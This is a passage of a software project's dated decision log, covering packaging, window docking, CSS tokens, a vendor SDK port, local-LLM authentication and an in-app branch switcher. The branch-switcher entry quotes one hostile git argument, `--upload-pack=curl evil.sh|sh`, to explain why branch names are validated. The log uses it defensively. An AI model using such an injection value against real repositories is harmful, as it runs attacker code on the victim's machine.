`npm run bootstrap` gives a worktree its `node_modules` as a symlink at the main checkout's tree. Everything in this repo resolves modules the way Node does — lint, type-check, `test:all`, `build`, `dev` — so the shortcut has been free. **electron-builder does not.** It collects the dependency tree by reading `node_modules` itself, and through the link it finds the direct dependencies and nothing beneath them. It says so, at length:

    cannot find path for dependency dependencies=["zod@undefined","playwright@undefined", …]

and then **exits 0**. Measured on this branch: 18 direct dependencies bundled, **175 transitive packages missing**. Chief among them `playwright` and `playwright-core` — `@playwright/test` was present, and it requires `playwright` internally, and `main/services/playwright-runner.ts` spawns the CLI out of the bundle's own tree. So the app builds, installs, opens, and looks correct; the first thing that fails is pressing Run.

**The existing note did not cover it.** `bootstrap-worktree.mjs` said to replace the link "if you change dependencies on this branch", which is a rule about *lockfile divergence*. Here the lockfiles were identical and the tree was byte-for-byte the right one — the failure is that electron-builder cannot traverse a link, so no statement about dependency *contents* could ever have caught it.

**Two guards, and the second is the one that matters.** The preflight refusal is the cheap half: it names the cause before a multi-minute build, at the moment the fix costs one command. But a guard that only knows about symlinks goes green on every other way a bundle can come out incomplete — a `files` pattern that excludes too much, a dependency moved to `devDependencies`, a future electron-builder that drops something new. So `--verify` re-asks the finished `.app` the runtime question directly and is what the exit code now depends on. It also runs in CI after `electron-builder`, where the install is real: that is the only place the assertion is regularly exercised against a bundle that is *supposed* to pass, so a guard that started rejecting good builds surfaces as a red gate instead of as a local mystery.

**Resolve, don't compare listings.** The verify half walks the closure and asks whether each package is resolvable *from the directory that needs it*, by Node's own walk-up rule, rather than checking that a path exists where the source tree had one. npm hoists most packages to the top level and nests the ones it cannot; both layouts are correct, and a path comparison reports the nested case as a broken build. It follows `dependencies` only — `devDependencies` are never shipped, and an `optionalDependency` that was legitimately pruned must not read as a failure.

**The fixture had to have a transitive level, or it proved nothing.** The bug shipped *every* direct dependency. A check whose fixture only had direct dependencies would pass against the exact bundle being guarded against, so `check:package-integrity` builds a miniature project three levels deep and omits only the deep ones. It also nests a package in the source tree and hoists it in the bundle, which is what keeps a future rewrite from turning the resolution into a path comparison. Verified in both directions for real, not just on fixtures: packaged from the symlinked worktree the verify half reports **175 packages missing** and exits 1; after `rm node_modules && npm install --include=dev` the same command reports **193 runtime packages across 580 dependency edges, all resolvable**, and `npm run package` exits 0 with `playwright` and `playwright-core` present.

**One assertion in the check was vacuous and shipped green in draft** — worth recording because it is the failure mode CLAUDE.md warns about and it still got written. The docs half was pinned with `/packag/i`, which matches `package-lock.json`; that string has been in `bootstrap-worktree.mjs` since it was written, so the assertion would have passed before the note existed and would keep passing if it were deleted. It now matches `npm run package` literally, in both that file and CLAUDE.md.

**`scripts/switch-branch.mjs` was checked and is fine.** It gives branch worktrees the same symlink, but it never packages — it runs the branch's own `npm run build` (Vite and esbuild, which resolve like Node), and the app it launches finds the Playwright CLI through the link at runtime because `fs.existsSync` follows symlinks (confirmed against the runner's exact lookups). Adding a real install there would cost minutes per switch and buy nothing. Said so in its header, since "why does the other worktree script get away with this" is otherwise a question that has to be re-derived.

### 2026-08-09 — The trainer panel opened on top of the page it exists to keep visible

**Symptom:** start a training session at a window-size preset and the trainer does not dock — it opens in the middle of the training browser, over the page. Reported against Chrome; it has nothing to do with which browser (see the last point).

**The refusal was correct; the fallback was never written.** `computeDock` returns `null` when a preset browser plus a 360pt panel exceeds the display — deliberately, since the preset is the width the recorded test replays at and shrinking it would record against a layout the run never sees (2026-08-06 above). `openTrainerPanel` handles that by opening the panel undocked, and "undocked" was expressed as *passing no coordinates*: `x: layout?.panel.x`. A `BrowserWindow` with no x/y is **centred on the display** by the window layer — which is where the training browser is. So the one path that exists to keep the panel off the page put it exactly on it. Nothing threw, nothing logged, and every geometry test passed, because in that branch the geometry was never computed.

**How ordinary the case is:** the pair needs `browser + 360` points of work area. On a 14" MacBook (1512pt) that rules out **Desktop 1280×800 and Laptop 1440×900 — two of the four presets on offer**. The default ("Default", no preset) docks fine, which is why this survived: the first thing anyone tries works.

- **`computeParkedPanel` chooses the rectangle instead.** Flush beside the browser when a whole panel fits there — refusing to dock and having nowhere to be are different questions, and `computePanelFollow` already answers the second — otherwise against the work-area edge that covers *less* of the browser. Some overlap is unavoidable by then (a pair that fitted would have docked); which half of the page it eats is not. Same top and height as a dock, so a parked panel reads as the panel that would be docked.
- **Rejected: docking anyway by clamping.** That is the mabl behaviour 2026-08-06 turned down for the follower, for the same reason — a panel over the page under test is the one outcome the feature exists to prevent. Also rejected: falling back to the splitting dock (silently changes the recorded viewport, which is the exact divergence the preset exists to prevent) and shrinking the panel to fit (1512 − 1280 = 232, below the 300pt readability floor, and it does not save the 1440 preset at any size).
- **The panel could not find out it was undocked.** `trainerPanel:undocked` is pushed while the panel window is still loading its page, so the renderer that most needs it — the one that opened undocked — never receives it, and the control kept its optimistic "docked" default. It then offered **Undock** for a panel that is not docked, and pressing it called `undock()` on an already-undocked panel: a dead button on the exact arrangement the user wants fixed. Fixed with `trainerPanel:getState` and an ask on mount, the `recorder:getSteps` lesson (2026-08-06) applied to a second piece of state a late-opening window cannot be told. The reply is the INITIAL value only — a push that lands while it is in flight wins, or a slow round trip silently rolls the button back to a state that is no longer true.
- **The tooltip now says which of the two it is.** "No room to dock at this window size" is actionable; an undocked panel with no explanation is indistinguishable from a broken feature — which is how this was reported.
- **Verified live, which is what was missing.** 2026-08-06 shipped this feature "not yet live-verified — every behaviour here is native window geometry, which a terminal cannot observe". `e2e/trainer-dock.spec.ts` observes it: the real app, real windows, bounds read from the main process. It sizes its own too-wide preset from the display it finds, so the case reproduces on a laptop and a CI runner alike. Reverting the fix fails it with the actual rectangles in the message.
- **The browser choice is not involved.** The trainer always runs in the Electron (Chromium) window: there is no Firefox or WebKit trainer, `defaultRunBrowser` is documented as affecting runs only, and the training window explicitly *denies* the `openExternal` permission, so a training URL never reaches Chrome or Safari. Confirmed by running the same session under all three settings — byte-identical geometry.

### 2026-08-09 — The AI debug follow-up send moved inside the textarea, and is a raw button on purpose

Small change, three decisions in it that all read as sloppiness later if they are not written down.

**It is a raw `<button>`, not `@ui`'s `Button`.** The brief was an icon with no border and no button styling, and every `Button` variant carries chrome — including the one that sounds like it does not: `transparent` still paints `hover:bg-muted/70`. Opting out has a cost that is easy to miss, and this repo has already paid it once: `body` and Tailwind v4's preflight *both* set `cursor: default` on buttons, so a hand-rolled button gives no hover affordance unless it asks for `cursor-pointer` itself. That is the bug `check:clickable-chrome` exists for (#44), and it does not cover elements outside `buttonVariants`.

**Disabled keeps the arrow rather than `pointer-events-none`.** `Button` disables with `pointer-events-none`, which is tidier and also suppresses the `title` — so the one state where the user needs to be told why nothing happens becomes the one state that cannot tell them. `disabled:cursor-default` instead, and the hover label survives.

**The hover label is a `title`, not a Tooltip.** Not a style preference: Radix's tooltip cannot be opened under jsdom (it needs pointer APIs jsdom lacks), so a Tooltip here would be untestable, and this control has *no visible text* — the label is its only accessible name. `SEND_FOLLOW_UP_LABEL` is exported and used for both `aria-label` and `title`, which is what stops the two drifting into a control that reads one way to a screen reader and another to a mouse. It names the Enter shortcut too, because the composer has always sent on Enter and nothing said so anywhere.

**`pr-10` on the textarea is load-bearing**, and is the one part of this that jsdom cannot check: it reserves the icon's column so a long line runs out of room before it runs underneath the glyph. There is no layout engine in the dom suite, so the test asserts the class as a proxy and says so.

### 2026-08-09 — Every run failed on a symlink the port inherited, and a third of the design system was never wired up

Two unrelated-looking faults, one shared cause: **adopting the Glaze data directory also adopted things inside it that referred to Glaze.**

**Every test run failed instantly**, with `Playwright Test did not expect test() to be called here` followed by `No tests found` — collection, so no step ever ran. The message lists three causes and the real one is the third: two copies of `@playwright/test`. `<scriptsDir>/node_modules` is a symlink the runner drops beside the generated specs so they can resolve their import, and the scripts dir now comes from the *adopted* Glaze store (#37), so the link inside it still pointed into `.glaze-sources/node_modules`. The CLI ran from ours, the spec resolved theirs, and Playwright compares module identity rather than version.

**`ensureModuleResolution` only ever created a MISSING link, never repaired a wrong one**, and the guard it used made that unfixable: `fs.existsSync` **follows symlinks**, so once the Glaze tree was deleted the dangling link reported `false`, `symlinkSync` threw `EEXIST` on the occupied path, and the warning was swallowed — leaving the broken link in place and resolution falling through to `NODE_PATH`, which ESM imports do not consult at all (the capture fixture is `.mjs`). So the bug had two faces: two Playwright copies while the SDK was installed, and a silent dependence on a fallback afterwards. It now `lstat`s — asking what the link *is*, not what it points at — and repoints anything aimed elsewhere. A real directory is left alone: that is someone's own install, and deleting it is destructive in a way that rewriting a symlink is not.

**The visual half was larger and had been on screen the whole time.** Twenty-eight class names and fourteen custom properties came across from the SDK's vocabulary with nothing on the other end — the ported views were deliberately not rewritten (PORTING.md), so they still speak `text-primary/secondary/tertiary`, `support-*`, `bg-panel`, `bg-well`, `blue-9`. None of those names arrived with the component library. The Stats pass/fail chart drew no bars over 677 runs of data, because `bg-support-green` gave the divs a height and no background. The Script view had no syntax highlighting at all (`--color-token-*`). The "this step is new" and "this step just ran" outlines never drew, because `outline: 1px solid var(--undeclared)` is invalid at computed-value time and drops the entire shorthand — `check:step-glow` passes, because it checks that the class is applied, not that the class paints.

**The worst one resolved to the wrong thing rather than to nothing.** Tailwind derives a whole utility family from one colour key, and this app needs the halves to differ: `bg-secondary` wants the secondary *surface*, `text-secondary` wants the middle step of the *text ramp*. With `--color-secondary` present Tailwind emitted `.text-secondary{color:var(--secondary)}` — a panel fill used as text colour, 1.4:1 against the background, across 62 call sites. It looked like a deliberately dim label. Meanwhile `text-primary` and `text-tertiary` had no rule at all and inherited the foreground, so "tertiary" text rendered *brighter* than "secondary" and the hierarchy those three names exist to express was inverted.

**Fixed by declaring the vocabulary, not by rewriting the call sites.** Rewriting 170 usages onto existing names is a large diff across twenty view files with no way to verify the result except by looking at all of them, and `text-tertiary` has no equivalent to be rewritten to. Declaring the tokens is contained, reversible, and matches the precedent already in `styles.css` — `--color-list-selection` was added for exactly this reason, one class at a time, when the selected sidebar row was found to look like every other row. The collision was resolved by moving the nine *surface* call sites to `fill-secondary` (same value, own key) rather than by trying to out-specify Tailwind: a same-named `@utility` **loses** to the theme-generated one, which was tried first and silently did nothing.

**The guard is the point of the entry.** This is the third time the repo has shipped this bug — `bg-muted`, then the whole `border-token-*` family (2026-08-06), now this — and all three were found by a person looking at the screen. Nothing else can: an unknown class is not an error, it emits no rule, the element keeps what it inherited, and the result reads as a design choice. `check:theme-tokens` was the response to the first two, and it only covers `--gl-*` — the redesign's own layer — which is exactly why it did not see any of this. `check:renderer-classes` closes the general case: it builds the renderer and **asks the emitted stylesheet** whether every class the renderer uses produces a rule and every `var()` read is declared. The oracle has to be the real build; a list of expected names is a second source of truth that can agree with the code while both are wrong. It builds into a fresh temp directory each run because Vite hashes filenames and does not clear stale ones — auditing a reused `build/` reported one of these fixes as not having worked when it had. And it pins the `text-secondary` collision **by value**, so it fails however the wrong colour arrives. Verified failing three ways: a colour token removed (2 classes reported), `--color-secondary` reintroduced (the collision assert fires), and the runner fix reverted (2 of 6 new unit tests fail, precisely the two that encode the reported failure modes).

### 2026-08-09 — Abandoning Glaze: the drift guard retires itself, and a comment that regenerated dead CSS

Glaze is no longer part of this project's life, so the things that existed to keep two shells in step come down. `main` already carried no `@glaze/*` dependency — the port finished at #18 — but `shell/electron` was still on the remote, 18 commits of parallel history whose *content* `main` had entirely absorbed (zero files existed there and not here; the diff was 1037 insertions on main's side and nothing on the branch's). Keeping it had one visible cost: `check:shell-drift` compared `main` against it on every push and went red, on `main`, permanently.

**The branch was the fix, not the check.** `check-shell-drift.mjs` was written to retire itself: with no counterpart ref it prints `nothing to compare` and exits 0, *deliberately* rather than erroring, on the reasoning that a guard which goes red because its problem was solved trains people to ignore it. Deleting the branch turned CI green with no code change. The branch is preserved as the tag `archive/shell-electron`, which costs nothing and makes "we can always look" true rather than hoped. The check stays wired up — it is what would notice a second shell reappearing.

**What did NOT come down, and this is the point.** `window.glazeAPI` (85 references across 28 files) and `@shell/backend` both keep their names. The global is a rename with real breakage risk and no functional gain. The seam is better than that: it is what confines `electron` imports to `main/shell/`, enforced by ESLint, and it would be worth having if Glaze had never existed. Abandoning a vendor is a reason to delete their branches and directories, not their good ideas.

**The repository also moved out of `~/Library/Application Support/app.glaze.macos.main/…/.glaze-sources`.** The canonical checkout had been living inside Glaze's own data directory, where uninstalling Glaze would have taken the repo and its worktrees with it. It is now an ordinary clone at `~/Code/good-looks`. The duplicate `source/` tree in the hand-off folder went at the same time: it had no `.git`, it had already drifted, and on this same day it produced the confusing result of a fixed bug appearing unfixed, because the running app was built from a tree nobody was tracking.

**A postscript worth more than the rest of this entry: Tailwind v4 extracts class candidates from raw file text, and does not skip comments.** The fix above removed an arbitrary-variant z-index lift from the markup, and the comment explaining its removal *spelled the utility out* — which regenerated the rule into the built CSS for a class no element carries. Behaviourally harmless, and still a real defect: grepping a shipped bundle for that rule then reports the fix as missing when it is present, which is exactly the false signal that cost an hour the same afternoon. `check:clickable-chrome` now tests RAW source, comments included, and the comment describes the removed utility in prose instead of spelling it. Verified by putting the literal back in a comment alone and watching the check go red.

### 2026-08-09 — The "+" button could not be clicked, because a drag region from a window shape we no longer have was sitting on top of it

Creating a test is what this app is for, and the "+" in the sidebar header — the one the empty state tells you to click — did nothing. Hovering it did not even change the cursor, which is the detail that named the bug: a dead handler still shows hover feedback, so the pointer was never reaching the button at all.

**The cause was a leftover from a window shape this app stopped having.** `root-view.tsx` opened with `<div className="drag-region fixed left-0 right-0 top-0 h-13" />`, dating from the Glaze SDK era when the host window was frameless and the web content had to supply its own draggable title strip. The main window now takes Electron's default native title bar (`main/index.ts` passes no `frame` and no `titleBarStyle`), so the OS strip drags the window and that div dragged nothing whatsoever. What it still did was be `fixed`, and a positioned box paints above in-flow content **regardless of DOM order** — so it won every hit test in the top 52px of the app, which is exactly the band the sidebar header occupies. Verified both directions in the browser preview: with the overlay, `elementFromPoint` over the "+" returns the overlay and clicking it calls no menu; without it, the button, and the popup fires with all five items.

**Deleted rather than neutralised.** The tempting fixes are `pointer-events-none` or a negative `z-index`, and both keep a drag region alive on the theory that something needs it. Nothing does: the elements in that strip that genuinely want to drag the window (`Toolbar`, the `Sidebar` header) already carry `.drag-region` themselves, and the one window with no native title bar — the trainer panel, `titleBarStyle: "hiddenInset"` — has its own header drag region. Keeping a redundant overlay in a non-obvious state is how this bug survived a full port; a class doing nothing is worse than no class, because the next person reads it as load-bearing. The `[&:not(:has([data-toolbar]))_.drag-region]:z-50` lift on the wrapper existed only to raise that overlay and went with it.

**The second half was the cursor, and it is a separate bug that pointed at the first.** `@ui`'s `buttonVariants` never asked for `cursor-pointer`. `body` sets `cursor: default` app-wide and Tailwind v4's preflight sets it on `button` too, so *every* Button in the app had been drawing the plain arrow. That is why the missing cursor was not, on its own, evidence of the overlay — but it is a real defect of its own: the app's bespoke theme layer already treats pointer-on-hover as the house rule (`.gl-btn`, `.gl-menu-item`, `button.gl-tag-stack`), so the ported component library was the odd one out. Fixed at the base class, once, for every button.

**The guard is source-level (`check:clickable-chrome`) because jsdom cannot see either failure.** `library-sidebar.test.tsx` clicks that same "+" and asserts the menu opens — and it passed for the entire life of the bug, because jsdom has no layout engine and an element covering another element is simply not a thing it can represent. The dom project also runs with `css: false`, so a computed-`cursor` assertion would read `""` whether the fix is present or not: the test that looks like the right one can only ever pass vacuously. The check asserts its own premise too — that the main window is still not frameless — so if this app ever does go frameless, the ban gets revisited instead of silently outliving its reason.

### 2026-08-09 — Running another branch of this app from inside it, and why a branch name is untrusted input

Reviewing a pull request against this app meant stopping, stashing, checking out, installing, building, launching, undoing all of it — enough friction that branches got merged on the strength of a diff. The Branches view (route `/branches`, `scripts/switch-branch.mjs`) turns that into picking a PR from a list.

**A worktree, never `git checkout` in the user's own tree.** The obvious implementation switches the checkout to the branch. That is wrong three times over: it discards or blocks on uncommitted work, it rewrites the files of the application that is currently running, and if the branch fails to build there is no way back. A worktree under `userData/branch-builds/` leaves the checkout untouched, which is what makes "back to my checkout" a thing that always works rather than a thing that has to undo something. Every worktree is created **detached**, because a branch can only be attached in one worktree at a time — and the branch you most want to try is often the one already open in another window.

**A branch name is untrusted input, in exactly the sense `normalizeRawStep` means.** It arrives as a pull request's head ref, which anyone who can open a PR chooses, and it then becomes two different dangerous things. As a **git argument**: `execFile` spawns no shell, so nothing in a ref can inject a command — and that is precisely why the reflex fix (quoting) is useless here, because `git fetch --upload-pack=curl evil.sh|sh` is not injection, it is an option git honours. As a **directory name**: what gets written there is a whole checkout that is then built and executed, so `../../..` is arbitrary code at an arbitrary path. `shared/branch-paths.mjs` refuses a leading `-` before anything else and refuses any name that leaves the builds root, and it **throws instead of falling back** — there is no safe default directory to fall back to.

**The validator lives in `shared/` because there are two runtimes.** The service is compiled TypeScript; the build script is plain `.mjs` with no build step. That is the same split the MCP server has, and the same reason: a transcribed copy of a regex is correct the day it is written and silently divergent afterwards. Here what diverges is a security check, and the direction it fails is the script accepting a name the app refuses. `check:branch-switch` pins that there is one copy, and runs the real script against hostile names rather than trusting the source scan.

**`app.relaunch`, and therefore the branch travels in argv.** Spawning a replacement ourselves would briefly leave two copies alive against one data directory, and every store here is read-modify-write JSON with no locking; `app.relaunch` starts the new instance only after this one exits. The cost is that the new instance inherits this one's ENVIRONMENT — and under `npm run dev` that includes `GOOD_LOOKS_DEV_URL`, pointing at a Vite server that the dev harness closes the moment it sees Electron exit. Honouring it loads the new build's windows from an origin that no longer answers, which in this app presents as **a blank window and a clean log** — the failure mode that has cost the most debugging time here. So `--gl-no-dev-url` rides on every relaunch, including the one home, and `--gl-branch=` carries what is running. This was verified by launching with a dead `GOOD_LOOKS_DEV_URL` set: without the flag the log shows `ERR_CONNECTION_REFUSED` and an empty window; with it, `app://bundle/main-window.html`.

**Electron only, and unavailable rather than degraded.** A packaged build has no source, no `.git` and no devDependencies; the browser preview has no backend at all. Neither can be given a fake — everything else in `preview-bridge.ts` stands in for *data*, while this feature's job is to run git, build a checkout and relaunch a native app. So `branches:status` answers `available: false` **with a sentence saying why**, the preview's bridge answers it explicitly (rather than letting `defaultFor` return null into a view that destructures it), and the sidebar row is hidden rather than disabled — a permanently greyed row is a standing question for everyone who is not building this app.

**api.github.com is the app's second outbound host**, after the opt-in alert webhook, and the first it contacts without being handed a URL. It is worth naming plainly against the posture set on 2026-08-04: the request goes out only from the main process (`check:renderer-egress` keeps the renderer out of it), only while this view is open, only for `origin`'s owner/repo, and only when the app is running from a git checkout — which is to say never in a build anyone else would run. The token is optional and stored the same way as the other two credentials; it is needed for a private repository because GitHub answers **404, not 403**, for repositories a request cannot see, so the un-tokened failure reads as "no such repository".

**The shared data directory is the one thing switching back cannot undo.** A branch build resolves `userData` exactly as the checkout does — same library, same run history, same keys — which is what makes it useful for review and is also the whole risk: a branch that migrates a store migrates yours. That sentence sits next to the switch buttons rather than in a doc, because the only moment it can be acted on is the moment before the click.

### 2026-08-09 — LM Studio can demand a bearer token, and the 401 it answers with looked like a wrong URL

LM Studio's local server has an authentication setting. With it on, every route returns 401 — including `GET /v1/models`, the probe behind the connection dot — and this app sent no `Authorization` header anywhere, so the provider simply could not be connected to. `fetchModels` turned the 401 into `LM Studio returned HTTP 401`, which named neither the cause nor the fix.

**What made it expensive to diagnose is LM Studio's own log.** A rejected request is logged as `Unexpected endpoint or method. (GET /v1/models). Returning 200 anyway`. That sentence points at the URL — the one thing that was correct — and it says 200 while the wire carried 401. Anyone reading it goes to check the server address and finds nothing wrong. `curl` against the port is what settled it, and the decoded message now has to carry what the log won't: the setting that causes this, and where the token lives on each side.

**A stored token, not a settings field.** The token is a bearer credential, so it goes through the same safeStorage path as the Anthropic key rather than into `llm-config.json` next to the base URLs — write-only from the renderer, `hasToken` boolean back. That meant extracting `encrypted-secret-store.ts` from `anthropic-key-store.ts`; the parts worth not re-typing are the ones that are silently wrong when re-typed (the tmp+rename write, and not caching a decryption failure).

**The header goes on all three LM Studio routes, not just chat.** `/api/v0/models` — the load-state probe — swallows its own failures by design, so a token applied only to `/v1/models` and chat would cost the load badge with no error anywhere. And no stored token means NO header rather than an empty bearer: unauthenticated is the default configuration, and an empty `Authorization` would turn a working server into the exact 401 this exists to fix.

**A 401 is not "make sure it is running".** `status()` used to regex the error text for transport patterns and replace anything matching with the "is it running?" hint. An authentication failure proves the opposite — the server answered — so `/v1/models` throws a `ProviderError` for 401/403 and `status()` now checks the TYPE, the same argument already made for `runChat`. Text-matching would also have been fragile here in a new way: the decoded sentence quotes nothing from the provider, but it does contain the words "token" and "server".

**Missing and rejected are separate messages.** Same status, different fix: paste a first token, versus replace a stale one. Collapsing them sends half the users to do the wrong thing, so `describeLmStudioAuthFailure` takes `hasToken` and the tests pin both. The generic "unauthorized (HTTP 401)" wording stays for Ollama, which has no token field in this app — pointing at one it doesn't have would be a confident lie about where the problem is.

### 2026-08-09 — The port pointed at an empty data directory, and only launching it showed that

The first launch of the Electron build on a machine with real data opened an empty library: no tests, no runs, no saved API keys, no downloaded browsers. Nothing had been deleted. Under Glaze the host supplied `userData` as an app-scoped directory (`app.glaze.macos.<id>-local/`); stock Electron derives it from `productName`, so the port began reading and writing `~/Library/Application Support/Good Looks!/` while 1.4 GB of real store sat one directory away.

**The failure mode is the point.** It did not error, log a warning, or fail a test — it presented as a wiped install. Every store test points `userData` at a temp directory, which is the correct thing for a test to do and precisely why this was invisible: the tests were all passing against exactly the behaviour that was broken. It survived a 42-check suite, 1912 tests, a five-job CI run including a packaged-app e2e pass, and an independent verification by a second agent. What found it was reading one line of a launch log — `[metrics] Built the metrics database from history {"runs":0,"steps":0}` — and asking why the number was zero.

**Adopt in place, do not copy.** Copying 1.4 GB creates a second source of truth, a half-migrated state if it is interrupted, and a moment after which the two builds silently diverge. Pointing at the existing directory has none of those: no data moves, a Glaze build of this app keeps working against the same store, and the operation is idempotent. The cost is that two builds can share one store and disagree about it — strictly better than the port pretending the data does not exist.

**Adoption is one-shot by construction.** It fires only when the current directory has no recorder store of its own, so it can never redirect an install that has started accumulating data, and it stops firing the moment the port writes anything real. The subtle part is what counts as "has a store": `metrics.db` must NOT, because it is a derived shadow (see the metrics DB note in CLAUDE.md) and the port writes an empty one on first launch. Counting it would mean adoption never fires on the second launch, reproducing the original bug in a form that looks like correct behaviour. That case has its own test.

**Ordering is load-bearing.** `installUserDataPath()` is the first statement in `main/index.ts` because `applyRetention()` runs at module scope there and prunes artifacts; pointed at the wrong directory it sweeps the wrong ones. Imports are hoisted, so "first" means first in the body, not first in the import list — which is why the call is not tucked in among the imports where it would read more naturally and run too late.

**Coverage:** `user-data.test.ts`, 18 cases against real temp directories rather than a mocked `fs` — the bug was about what is actually on disk, and a mock would have agreed with whatever the code believed. Verified failing three ways: adoption removed entirely (3 fail), `metrics.db` counted as a store (2 fail), and the own-store guard dropped (2 fail). Then verified by launching: the app adopted the real directory, logged it, wrote `main.log` there, and the 36 tests were intact and unpruned afterwards.

### 2026-08-09 — Merging main into the Electron port: twelve conflicts, and the two that could have shipped a regression

`shell/electron` branched at `main@8262136` and then both sides moved. Six commits landed on `main` — the redesign foundation, the fifteen primitives, and the favicon egress fix — while the branch ported the app off the Glaze SDK onto stock Electron. Twelve files conflicted. Most were mechanical; two were not, and both would have passed a careless resolution.

**`library-sidebar.tsx` could have resurrected the egress bug.** The branch still carried the pre-#36 `Favicon`, which fetched `google.com/s2/favicons` for every test in the library on every sidebar render. Only the import line actually conflicted — git merged the post-fix `SiteIcon` body cleanly — so resolving the conflict toward the branch, which is the obvious instinct on a port branch, would have reinstated the third-party fetch while leaving the fix's own tests passing on the parts they cover. Resolution: `@ui` for the specifier, main's body, `FlaskConical` dropped.

**`package.json` could have silently deleted five checks.** The branch predates `check:theme-tokens`, `check:status-width`, `check:selection-neutral`, `check:crt-untreated` and `check:renderer-egress` — including the one that exists specifically to stop the egress bug recurring. Taking the branch's script block wholesale drops all five, and the failure is invisible: `test:checks` just runs a shorter chain and still prints ok. What made it survivable is that the `test:checks` chain itself merged *cleanly* and already named all five, so a dropped definition would have failed as "missing script" rather than passing quietly. That is luck, not design, and worth knowing about the next time this merge happens.

**The two preview implementations are one implementation.** Both sides added `renderer/dev/` independently, so all four files plus `preview.html` conflicted in full — 33 hunks. They are not divergent designs: `main`'s is the branch's own work, ported over on 2026-08-08 and developed further, with the same export surface plus `sdkChannels`. Took `main`'s wholesale rather than merging hunk by hunk.

**`vite.config.preview.ts` is deleted, folded into `vite.config.ts` as `--mode preview`.** That file existed to reproduce what the SDK's build did — alias `@glaze/core/*` at the SDK install, prepend the two framework CSS imports, and pin every bare specifier so the design system and the app shared one React instance. The port makes all of that dead: the component library is `renderer/ui` now, in-tree and resolved by the app's own config. What survives is the part that was about being a browser rather than about being Glaze — the fixed port 5199, `base: "/"` instead of `"./"`, and the SPA fallback, without which every `?view=` deep link 404s. Those moved into the mode branch.

**`check:text-color` lost its cross-check and got a better one.** It pins the 15 colours `Text` accepts and verified that pin against the SDK's `text-variants.d.ts`, skipping with a note when the SDK was absent. Post-port the SDK is *always* absent, so the arm was permanently dead while still printing ok — the exact failure mode the check exists to catch, one level up. Repointed at `renderer/ui/primitives.tsx`, which is in-tree and therefore always present, so a missing source is now a failure rather than a skip. The port's `Text` declares the same 15 colours, so the pinned union did not change.

### 2026-08-08 — Fifteen primitives, and the four contracts that only a source check can hold

Phase A3 of [REDESIGN.md](REDESIGN.md). `renderer/theme/primitives/` — fourteen components plus A2's `Atmosphere`, each with its own test file, plus `tokens.ts`, a specimen page, and the three guards §8.3 asked for. Nothing consumes them yet; A5 and Phase B are what start.

**The four contracts, and why each needed a check rather than a convention.** All four share a shape: they are invisible in isolation, invisible to the type-checker, and invisible to jsdom (no layout engine, and the dom project runs with `css: false`). Every one of them looks completely deliberate in review.

- **The status column has one edge.** `--gl-status-w` is 78px on every chip, and it fails ONE ROW AT A TIME — a single chip sized to its own content is correct-looking in isolation, in a screenshot, and in the component test that renders it alone. `check:status-width` also pins that `78px` is written down in exactly one file, because a second copy is a contract that will not be changed with the first.
- **Selection is never a status hue.** The rule is that colour means outcome, so a green selected row is a second thing on that row claiming a result — and on a row that is both selected and failing the two are arguing. The next person to add a selectable surface WILL reach for the accent colour, because that is what every other design system does. The check has two tiers, taken from the palette's own token list: the outcome hues and violet are banned from any selection, hover or active state, while `--gl-cyan` is declared "running / live / **focus**" and is therefore allowed on a caret or a focus ring but never on a selection, where it would be indistinguishable from "this row is running".
- **A CRT's contents are never treated.** The one rule here that is about correctness rather than taste: an amber cast from our own chrome is indistinguishable from an amber cast in the page under test, and the user files the bug against their own site — or accepts a baseline our vignette darkened. The atmosphere layers are fixed and full-viewport, so anything not explicitly lifted above them is tinted *by default*; the bezel's z-610 is that lift. `check:crt-untreated` asserts it as a RELATIONSHIP (`crt > --gl-z-atmo`) rather than as the number, so raising the overlays without raising the bezel fails — and because someone tidying up "why is this z-index so high?" would otherwise be undoing a correctness guarantee that looks like a magic number.
- **No status hue is ever written into a stylesheet.** `StatusChip` and `Btn tone="go"` both want `tone + "55"` over `tone + "12"`, and CSS cannot append to the result of `var()`. The tempting shortcut is to write the answer out once in the stylesheet; it renders identically today and goes stale the moment a hue is retuned, with half a screen shifting and half not, on the same row, reading as a rendering bug rather than as two copies of a colour disagreeing. So the derivation lives in `toneSurface()` alone and `check:theme-tokens` enforces it.

**`tokens.ts` exists, and it is deliberately small.** Every value in it is a second copy of something in `tokens.css`, which is exactly the drift this layer was created to prevent — so a value only qualifies on one of three grounds: it gets concatenated (`tone + "55"`), it gets interpolated (`Temp`'s ramp is arithmetic on a colour, and arithmetic belongs in a function a test can call), or it is a layout contract a check has to name. `check:theme-tokens` pins all fourteen against their declarations in both directions, which is what makes writing a colour twice safe rather than reckless. `color-mix()` was the obvious alternative for the concatenation case and was rejected: it computes to an `rgba()` jsdom cannot read back, which would put the chip's whole contract out of reach of a test.

**`Temp` is the one primitive making a claim rather than drawing a shape**, and two of its decisions are load-bearing. The ramp is **dead inside ±10%** — a table where every row is lit says nothing, because the eye has no way to pick the one row that matters out of forty that are all faintly amber; the dead band is the feature, not a tolerance. And **with no median it falls to `off` rather than defaulting to zero**: a fabricated median would colour every row on a young history, confidently and wrongly. That fallback lives in the primitive, not at the call sites, because the one call site that forgot would be the one shipping the confident wrong colour. Real medians arrive from `metrics-store` in Phase C (§6.3). The mixer interpolates alpha as well as RGB, which is not cosmetic: neutral is 62% alpha and the status hues are opaque, so an RGB-only mix would jump the first lit step to full opacity — a visible cliff exactly where the ramp is meant to be gentlest.

**Two things the design does that read as inconsistencies and are not.** `running` is not a tone — it takes the holo treatment, because running is the *absence* of an outcome and a green chip on a row still in flight looks like a row that finished and reported something. And the step-TYPE palette is deliberately separate from the status palette: an `assert` step is not "failing" because assertions are what fail, so type chips are muted categories and a status hue on one would make every step list read as a list of verdicts. The `SiteIcon` monogram palette is separate for the same reason and is pinned apart from `TONE` by a test.

**`StepRow` composes its shadows rather than choosing between them**, and this repo has already paid for the alternative. A real `border` participates in layout, so a list where some rows have one and some do not jumps by 2px per status change — `renderer/styles.css` records that exact fix for `.step-new`. And an animation touching the whole `box-shadow` property silently erased the selection highlight once already. So the status rail and the selection ring are combined into one declaration, and the test that a row can be selected AND failing without either claim hiding the other is the one that matters most in that file.

**A jsdom detail that made one assertion fail loudly and another pass vacuously.** jsdom normalises `color` and `background` to `rgb()`/`rgba()` but leaves `box-shadow` exactly as written. A "selection never uses a status hue" test checking only for the `rgb()` form therefore *cannot fail* — it was passing against a shadow that would have contained the hex. Both tests now check either notation, and both were verified failing when selection was deliberately tinted. Added to CLAUDE.md's environment gotchas.

